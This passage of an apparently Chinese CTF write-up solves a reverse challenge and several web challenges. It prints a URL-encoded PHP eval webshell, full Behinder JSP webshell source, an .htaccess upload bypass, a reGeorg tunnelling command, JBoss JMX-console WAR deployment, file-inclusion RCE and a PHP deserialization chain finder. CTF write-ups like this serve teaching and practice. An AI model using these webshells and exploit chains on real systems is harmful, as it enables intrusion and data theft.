class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j=((j + S[i]) + key[i % keylength]) % <span class="number">256</span></span><br><span class="line">        S[j],S[i]=S[i],S[j]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PRGA</span>(<span class="params">S</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[j],S[i]=S[i],S[j]</span><br><span class="line">        K=S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RC4</span>(<span class="params">key</span>):</span></span><br><span class="line">    S=KSA(key)</span><br><span class="line">    <span class="keyword">return</span> PRGA(S)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">p,stream</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:(x ^ stream.__next__()), p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    w=<span class="string">b&#x27;\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3&lt;\x151\x19\n\x8f&#x27;</span></span><br><span class="line">    e=<span class="string">b&#x27;$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~&#x27;</span></span><br><span class="line">    b=<span class="string">b&#x27;geo&#x27;</span></span><br><span class="line">    s=<span class="string">b&#x27;&#125;\xce`\xbej\xa2\x120\xb5\x8a\x94\x14&#123;\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141&#x27;</span></span><br><span class="line">    t=<span class="string">b&quot;Q_\xe2\xf8\x8c\x11M&#125;&#x27;&lt;@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1&quot;</span></span><br><span class="line">    m=&#123;<span class="number">2</span>:<span class="number">115</span> ,<span class="number">8</span>:<span class="number">97</span>, <span class="number">11</span>:<span class="number">117</span>, <span class="number">10</span>:<span class="number">114</span>&#125;</span><br><span class="line">    n=&#123;<span class="number">3</span>:<span class="number">119</span>, <span class="number">7</span>:<span class="number">116</span>, <span class="number">9</span>:<span class="number">124</span>, <span class="number">12</span>:<span class="number">127</span>&#125;</span><br><span class="line">    m|=&#123;x:x^n[x]<span class="keyword">for</span> x <span class="keyword">in</span> n&#125;  </span><br><span class="line">    m|=((i.bit_count(),i) <span class="keyword">for</span> i <span class="keyword">in</span> b)</span><br><span class="line">    stream=RC4(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x[<span class="number">1</span>],<span class="built_in">sorted</span>(m.items())))) </span><br><span class="line">    <span class="built_in">print</span> (stream)</span><br><span class="line">    <span class="built_in">print</span>(xor(w,stream).decode())</span><br><span class="line">    <span class="comment">#p=sys.stdin.buffer.read()</span></span><br><span class="line">    p=<span class="string">b&#x27;\xe5\n2\xd6&quot;\xf0&#125;I\xb0\xcd\xa2\x11\xf0\xb4U\x166\xc5o\xdb\xc9\xead\x04\x15b&#x27;</span></span><br><span class="line">    e=xor(e,stream)</span><br><span class="line">    c=xor(p,stream)</span><br><span class="line">    <span class="built_in">print</span> (c)</span><br><span class="line">    <span class="keyword">if</span> sha256(c).digest() == s:</span><br><span class="line">        <span class="built_in">print</span>(xor(t,stream).decode())</span><br><span class="line">    <span class="built_in">print</span>(e.decode())</span><br></pre></td></tr></table></figure><p>运行脚本可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;generator object PRGA at 0x000001D8EACA83C0&gt;</span><br><span class="line">Give me the mystery string :</span><br><span class="line">b&#39;flag&#123;P0w5rFu1_0pEn_50urcE&#125;&#39;</span><br><span class="line">Congratulations! Now you should now what the flag is</span><br><span class="line">You are wrong!</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;P0w5rFu1_0pEn_50urcE&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h3><p>在页面源码中可见如下提示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /hint --&gt;</span></span><br></pre></td></tr></table></figure><p>访问 <code>/hint</code> 路由可得如下提示。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;hint&quot;</span>:<span class="string">&quot;# hint ^_^\n\tSo~ How to get files in this server? \n\tfiles/????????????????????????????????&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>访问 <code>/files</code> 路由，下载文件可得如下提示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Try to scan 35000-40000 ^_^.</span><br><span class="line">All tables are empty except for the table where the username and password are located</span><br><span class="line">Table: employee</span><br></pre></td></tr></table></figure><p>使用 nmap 进行端口扫描，可以得到如下端口开放信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host is up (0.094s latency).</span><br><span class="line">Not shown: 5000 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">36842&#x2F;tcp open  unknown</span><br></pre></td></tr></table></figure><p>访问 36842 端口可得一个登录界面，稍微尝试可得 SQL 注入点。根据提示爆出账号 <code>admin</code>，密码 <code>99f609527226e076d668668582ac4420</code>。</p><p>扫描可得 <code>/file</code> 路由，存在一个文件上传点，尝试上传一个 <code>.htaccess</code> 将 txt 文件</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addhandler php5-script .txt</span><br></pre></td></tr></table></figure><p>将其上传后再尝试上传 PHP 文件。存在危险字符检测，因此采用触发写入，将内容完全 URL Encode，构造上传载荷如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">&quot;this.txt&quot;</span>,urldecode(<span class="string">&quot;%3c%3f%70%68%70%20%65%76%61%6c%28%22%24%5f%50%4f%53%54%5b%31%5d%22%29%3b&quot;</span>));</span><br></pre></td></tr></table></figure><p>将其上传后访问 <code>/upload/1d929bafc144014d7e7df7fe817232e4/info.txt</code> 即可得到一个 shell。使用蚁剑连接，发现没有权限读取 flag。使用插件扫描内网端口可得 8006 端口是开放的。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623577753006/013752c36527cc823be3a7265965b1f1a80580b8.png" alt="image-20210613174909763"></p><p>上传 reGeorg 的 <code>tunnel.nosocket.php</code> 将内网端口代理出来。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -l 0.0.0.0 -p 3333 -u http:&#x2F;&#x2F;121.42.242.238:36842&#x2F;upload&#x2F;382f1b9e4a7b75dbeb05a3c4ed2fab04&#x2F;tunnel.nosocket.php -k a</span><br></pre></td></tr></table></figure><p>访问 localhost:8006 可以发现存在 Jboss，采用 JMX-Console 未授权访问进行攻击。使用冰蝎的 jsp 一句话生成新的 war 包。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf zfsn.war shell.jsp</span><br></pre></td></tr></table></figure><p>将得到的包上传到可访问的路径下获取网址，使用 jboss.deployment 的 addUrl 将 war 包加载进去。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623592411437/37dc593e6dac7b21d484e82a8ed9634f2aa68485.png" alt="image-20210613215325841"></p><p> 使用冰蝎连接如下链接，即可在文件管理中读取到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8006&#x2F;zfsn&#x2F;shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623579630730/dbc0f7bd1357dc91baddc621cc7de517a2fe9b7b.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3&#125;</span><br></pre></td></tr></table></figure><h3 id="Hard-Penetration"><a href="#Hard-Penetration" class="headerlink" title="Hard_Penetration"></a>Hard_Penetration</h3><p>使用 shiro_attack 2.0 对 <code>/login</code> 路由进行攻击。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623603081793/f84813bafbb79f7380b76a8063202855ae8167f4.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623603059172/73cc69b5a12c5122d7c82d202d9e51cba4ff131e.png"></p><p>使用该工具对 /login 注入冰蝎的 jsp 木马并使用冰蝎连接。使用命令执行发现 flag 无法直接读取，但是 apache 的配置下存在 8005 的开放端口。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623605614654/262e52533fac643ae85ab8994772c9c0c7e01ff0.png"></p><p>由于 <code>/var/www/html</code> 无权访问，因此尝试使用端口映射将服务代理出来。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623605772667/aec1a87c96ce157d075ce1f7d05f9ae8a4b26d1c.png"></p><p>根据网站上的文字猜测是 BAOCMS，在 GitHub 上找到类似的源码进行审计。可以发现在 <code>Delivery/Common/display</code> 下存在文件包含。display 中调用到的 parseTemplate 方法直接返回了处理过的文件名，由 display 借由 fetch 直接 include 进到页面中，因此假使模板文件是 PHP 代码，其亦可成功执行。因此，上传一个包含 <code>&lt;?php system(&quot;cat /flag&quot;);</code> 的 html 文件，再请求到这个路由直接将其包含即可 RCE。除此之外，还需要获得有效的 uid 才能进行操作，在 common.php 中可以找到如下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setUid</span>(<span class="params"><span class="variable">$uid</span>=<span class="number">1</span></span>)</span>&#123; <span class="comment">//固定 uid 为 1，方便调试获取对应 cookie</span></span><br><span class="line">    import(<span class="string">&quot;ORG/Crypt/Base64&quot;</span>);</span><br><span class="line">    <span class="variable">$uid</span> = <span class="string">&#x27;USER_&#x27;</span>.<span class="variable">$uid</span>.<span class="string">&#x27;_&#x27;</span>.NOW_TIME;</span><br><span class="line">    <span class="variable">$uid</span> = Base64::encrypt(<span class="variable">$uid</span>, C(<span class="string">&#x27;AUTH_KEY&#x27;</span>));</span><br><span class="line">    cookie(<span class="string">&#x27;Tudou_TOKEN&#x27;</span>,<span class="variable">$uid</span>,<span class="number">86400</span> * <span class="number">365</span>); <span class="comment">//存2小时</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUid</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    import(<span class="string">&quot;ORG/Crypt/Base64&quot;</span>);</span><br><span class="line">    <span class="variable">$token</span> = cookie(<span class="string">&#x27;Tudou_TOKEN&#x27;</span>);</span><br><span class="line">    <span class="variable">$token</span> = Base64::decrypt(<span class="variable">$token</span>, C(<span class="string">&#x27;AUTH_KEY&#x27;</span>));</span><br><span class="line">    <span class="variable">$token</span> = explode(<span class="string">&#x27;_&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">    setUid(); <span class="comment">//在此处添加一行代码，方便调试获取 cookie</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>[<span class="number">0</span>]!= <span class="string">&#x27;USER&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)<span class="variable">$token</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 getUid 函数内新增一行代码，动态调试到 setUid 即可得到有效的 <code>Tudou_TOKEN</code>。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8D%8A%84%7B%8E%9Ch%AB%8C%E0u%97%B3%9B%85%97%B2%7D%A7h%87txs</span><br></pre></td></tr></table></figure><p>将恶意 html 上传到 /tmp 目录下，发起文件包含请求即可获得 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623606478616/a04c24823b8a7cf29bdbc8a7c2d3221eec28ee82.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;82807831-5195-403d-b401-f180736ebea9&#125;</span><br></pre></td></tr></table></figure><h3 id="pop-master"><a href="#pop-master" class="headerlink" title="pop_master"></a>pop_master</h3><p>题目给出的代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="comment">//class.php.txt</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$class</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$class</span>-&gt;yuAp2O(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>class.php.txt 中是经过混淆的类，写个脚本一把梭回溯。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;memory_limit&quot;</span>, <span class="string">&quot;-1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> CLASS_FILENAME = <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$CLASS_FILE</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$classes</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$CLASS_FILE</span> = file_get_contents(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> CLASS_FILENAME;</span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generate a class PHP code as a node</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $class string class name</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $functionName string function name in the class</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $jmpClass string next node to jump to</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string generated class PHP code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GenerateClass</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$class</span>, <span class="keyword">string</span> <span class="variable">$functionName</span>, <span class="keyword">string</span> <span class="variable">$jmpClass</span></span>): <span class="title">string</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    (<span class="variable">$jmpClass</span> != <span class="string">&quot;&quot;</span>) ?</span><br><span class="line">        (<span class="string">&quot;class <span class="subst">&#123;$class&#125;</span>&#123;public function __construct()&#123;\$this-&gt;<span class="subst">&#123;$functionName&#125;</span>=new <span class="subst">&#123;$jmpClass&#125;</span>();&#125;&#125;&quot;</span>) :</span><br><span class="line">        (<span class="string">&quot;class <span class="subst">&#123;$class&#125;</span>&#123;public function __construct()&#123;\$this-&gt;<span class="subst">&#123;$functionName&#125;</span>=\&quot;None\&quot;;&#125;&#125;&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Find a class with specified function in it</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $functionName string function name to find</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed class that contains the function or false if no class contains</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindClassByFunction</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$functionName</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">        <span class="variable">$functions</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$functions</span> <span class="keyword">as</span> <span class="variable">$function</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$function</span>, <span class="keyword">array</span>(<span class="variable">$functionName</span>)))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$class</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Backtrace to find the path to eval</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $functionName string function name which is start of backtrack</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool false if none path found yet || none if path found which would have written to exp.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BackTrace</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$functionName</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$result</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$CLASS_FILE</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$classes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">        <span class="variable">$functions</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">        <span class="variable">$variables</span> = get_class_vars(<span class="variable">$class</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$functions</span> <span class="keyword">as</span> <span class="variable">$function</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$function</span>, <span class="keyword">array</span>(<span class="variable">$functionName</span>)))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$jmpFunction</span> = array_keys(<span class="variable">$variables</span>)[<span class="number">0</span>];</span><br><span class="line">                <span class="variable">$rule_0</span> = <span class="string">&quot;/public function <span class="subst">$functionName</span>\((.*?)\)(.*?)    &#125;/ms&quot;</span>;</span><br><span class="line">                preg_match_all(<span class="variable">$rule_0</span>, <span class="variable">$CLASS_FILE</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="variable">$rule_1</span> = <span class="string">&#x27;/\$this-&gt;&#x27;</span> . <span class="variable">$jmpFunction</span> . <span class="string">&#x27;-&gt;([a-zA-Z0-9]&#123;6&#125;)\(/&#x27;</span>;</span><br><span class="line">                preg_match_all(<span class="variable">$rule_1</span>, <span class="variable">$content</span>[<span class="number">0</span>][<span class="number">0</span>], <span class="variable">$matches</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(count(<span class="variable">$matches</span>[<span class="number">1</span>]) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable">$next_method_list</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">foreach</span>(<span class="variable">$next_method_list</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">                        <span class="variable">$extractFunctionContents</span> = <span class="string">&quot;/public function <span class="subst">$v</span>\((.*?)\)(.*?)    &#125;/ms&quot;</span>;</span><br><span class="line">                        preg_match_all(<span class="variable">$extractFunctionContents</span>, <span class="variable">$CLASS_FILE</span>, <span class="variable">$functionContent</span>);</span><br><span class="line">                        <span class="variable">$params</span> = <span class="string">&quot;\\&quot;</span> . <span class="variable">$functionContent</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$extractRightOp</span> = <span class="string">&quot;/<span class="subst">$params</span>=(.*?);/&quot;</span>;</span><br><span class="line">                        preg_match_all(<span class="variable">$extractRightOp</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>], <span class="variable">$rightOp</span>);</span><br><span class="line">                        <span class="keyword">if</span>(count(<span class="variable">$rightOp</span>[<span class="number">1</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// if none right operator when eval is valid</span></span><br><span class="line">                        <span class="variable">$isDestination</span> = preg_match(<span class="string">&quot;/eval\((.*?)\);/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>]) &amp;&amp; !preg_match(<span class="string">&quot;/=&#x27;/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">                        <span class="variable">$step</span> = FindClassByFunction(<span class="variable">$v</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$isDestination</span>)&#123;</span><br><span class="line">                            array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="variable">$step</span>));</span><br><span class="line">                            file_put_contents(<span class="string">&quot;exp.php&quot;</span>, <span class="string">&quot;&lt;?php&quot;</span> . PHP_EOL . implode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$result</span>) . PHP_EOL . <span class="string">&quot;echo serialize(new PADDING());&quot;</span>);</span><br><span class="line">                            <span class="keyword">die</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$step</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                            array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="variable">$step</span>));</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span>(!BackTrace(<span class="variable">$v</span>))&#123;</span><br><span class="line">                                array_pop(<span class="variable">$result</span>);</span><br><span class="line">                                <span 